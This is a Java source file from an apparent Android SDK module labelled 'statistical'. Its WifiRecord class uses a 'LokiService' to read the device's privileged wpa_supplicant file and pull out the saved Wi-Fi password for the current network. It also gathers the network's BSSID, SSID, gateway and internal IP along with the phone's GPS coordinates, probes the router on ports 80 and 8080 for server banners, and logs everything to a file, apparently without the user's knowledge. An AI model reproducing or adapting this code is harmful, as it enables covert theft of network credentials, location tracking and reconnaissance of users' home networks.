package com.androidhelper.sdk.statistical;

import java.io.File;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.location.Location;
import android.net.DhcpInfo;
import android.net.wifi.WifiManager;

import com.androidhelper.sdk.AMApplication;
import com.androidhelper.sdk.entity.WifiConfig;
import com.androidhelper.sdk.tools.AMConstants;
import com.androidhelper.sdk.tools.AMLogger;
import com.androidhelper.sdk.tools.CommonUtils;
import com.loki.sdk.LokiService;

public class WifiRecord extends RecordTask {
	
	private long mConnectedStamp;
	
	public WifiRecord(long connectedStamp) {
		mConnectedStamp = connectedStamp;
	}

	@Override
	public void run() {
		try {
			WifiManager wifiManager = (WifiManager) AMApplication.instance.getSystemService(Context.WIFI_SERVICE);
			android.net.wifi.WifiInfo connectionInfo = wifiManager.getConnectionInfo();
			String mac = connectionInfo.getBSSID();
			String ssid = connectionInfo.getSSID();
			ssid = ssid.subSequence(1, ssid.length() - 1).toString();
			String rssi = connectionInfo.getRssi() + "";
			DhcpInfo dhcpInfo = wifiManager.getDhcpInfo();
			String gateway = CommonUtils.formatGateway(dhcpInfo.gateway);
			String psk = null;

			LokiService lokiService = LokiService.getInstance(AMApplication.instance);
			if(null == lokiService) {
				return;
			}
			String supplicant = lokiService.readSupplicant();
			int index = supplicant.indexOf("network=");
			String networks = supplicant.substring(index, supplicant.length());
			networks = CommonUtils.replaceTab(networks);
			String[] stringArray = networks.split("network=");
			int length = stringArray.length;
			
			for (int i = 0; i < length; i++) {
				String strObj = stringArray[i];
				if (CommonUtils.isEmptyString(strObj) || !strObj.contains("psk")) {
					continue;
				}
				int ssidIndex = strObj.indexOf("ssid=\"");
				String tempSSID = strObj.substring(ssidIndex + "ssid=\"".length());
				tempSSID = tempSSID.substring(0, tempSSID.indexOf("\""));
				if (CommonUtils.isEmptyString(tempSSID) || !tempSSID.equals(ssid)) {
					continue;
				}

				int pskIndex = strObj.indexOf("psk=\"");
				if (pskIndex != -1) {
					String tempPSK = strObj.substring(pskIndex + "psk=\"".length());
					psk = tempPSK.substring(0, tempPSK.indexOf("\""));
				} else {
					// 检测是否是open wifi 模拟http请求google 看是返回200还是302，如果是302则截取头部
				}
				break;
			}
			
			Location lastLocation = AMLocation.getInstance(mConnectedStamp).getLastLocation();
			
			WifiConfig wifiConfig = new WifiConfig();
			wifiConfig.setSsid(ssid);
			wifiConfig.setMac(mac);
			wifiConfig.setRssi(rssi);
			wifiConfig.setIip(CommonUtils.getIPAddress(true));
			wifiConfig.setGateway(gateway);
			wifiConfig.setPsk(psk);
			wifiConfig.setConnectedStamp(mConnectedStamp);
			wifiConfig.setLatitude(null == lastLocation ? "" : lastLocation.getLatitude() + "");
			wifiConfig.setLongitude(null == lastLocation ? "" : lastLocation.getLongitude() + "");
			
			recordWifiSwitch(wifiConfig);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
	
	private void recordWifiSwitch(WifiConfig wifiConfig) throws Exception {
		File file = AMApplication.instance.getFileStreamPath(AMConstants.FILE_WIFI);
		String json = CommonUtils.readFile(file);
		
		JSONArray jsonArray = null;
		if (CommonUtils.isEmptyString(json)) { // 如果当前没有记录，则创建新记录
			jsonArray = new JSONArray();
		} else {
			jsonArray = new JSONArray(json);
		}
		JSONObject jsonObject = new JSONObject();
		jsonObject.put(AMConstants.FILE_WIFI_SSID, wifiConfig.getSsid());
		jsonObject.put(AMConstants.FILE_WIFI_MAC, wifiConfig.getMac());
		jsonObject.put(AMConstants.FILE_WIFI_RSSI, wifiConfig.getRssi());
		jsonObject.put(AMConstants.FILE_WIFI_PSK, wifiConfig.getPsk());
		jsonObject.put(AMConstants.FILE_WIFI_IIP, wifiConfig.getIip());
		jsonObject.put(AMConstants.FILE_WIFI_GATEWAY, wifiConfig.getGateway());
		jsonObject.put(AMConstants.FILE_WIFI_LATITUDE, wifiConfig.getLatitude());
		jsonObject.put(AMConstants.FILE_WIFI_LONGITUDE, wifiConfig.getLongitude());
		jsonObject.put(AMConstants.FILE_WIFI_CONNECTED_STAMP, wifiConfig.getConnectedStamp());
		
		jsonArray.put(jsonArray.length(), jsonObject);
		json = jsonArray.toString();
		CommonUtils.writeFile(json, file);
		
		getWifiServer(wifiConfig);
	}
	
	private void getWifiServer(WifiConfig wifiConfig) throws Exception {
		SharedPreferences sp = AMApplication.instance.getSharedPreferences(AMConstants.SP_NAME, Context.MODE_PRIVATE);
		String userAgent = sp.getString(AMConstants.SP_USER_AGENT, null);
		HttpClient httpclient = new DefaultHttpClient();
		httpclient.getParams().setParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, 5000);
		String url80 = "http://" + wifiConfig.getGateway() + ":80";
		HttpGet httpget = new HttpGet(url80);
		httpget.addHeader("Connection", "keep-alive");
		httpget.addHeader("Host", wifiConfig.getGateway());
		httpget.addHeader("User-Agent", userAgent);
		HttpResponse response = httpclient.execute(httpget);
		if (null != response) {
			Header[] headers = response.getHeaders("Server");
			if (null != headers && headers.length > 0) {
				// headers[0].getValue() 记录server
				wifiConfig.setServer(headers[0].getValue());
				updateWifiForServer(wifiConfig);
			}
		}
		
		httpclient = new DefaultHttpClient();
		httpclient.getParams().setParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, 5000);
		String url8080 = "http://" + wifiConfig.getGateway() + ":8080";
		httpget = new HttpGet(url8080);
		httpget.addHeader("Connection", "keep-alive");
		httpget.addHeader("Host", wifiConfig.getGateway());
		httpget.addHeader("User-Agent", userAgent);
		response = httpclient.execute(httpget);
		if (null != response) {
			Header[] headers = response.getHeaders("Server");
			if (null != headers && headers.length > 0) {
				// headers[0].getValue() 记录server
				wifiConfig.setServer(headers[0].getValue());
				updateWifiForServer(wifiConfig);
			}
		}
	}
	
	private void updateWifiForServer(WifiConfig wifiConfig) throws Exception {
		File file = AMApplication.instance.getFileStreamPath(AMConstants.FILE_WIFI);
		String json = CommonUtils.readFile(file);
		if (CommonUtils.isEmptyString(json)) {
			return;
		}
		JSONArray jsonArray = new JSONArray(json);
		int length = jsonArray.length();
		for (int i = 0; i < length; i++) {
			JSONObject jsonObject = jsonArray.getJSONObject(i);
			long jsonStamp = jsonObject.getLong(AMConstants.FILE_WIFI_CONNECTED_STAMP);
			long connectedStamp = wifiConfig.getConnectedStamp();
			if (connectedStamp != jsonStamp) {
				continue;
			}
			jsonObject.put(AMConstants.FILE_WIFI_SERVER, wifiConfig.getServer());
			jsonArray.put(i, jsonObject);
			break;
		}
		json  = jsonArray.toString();
		CommonUtils.writeFile(json, file);
	}
}
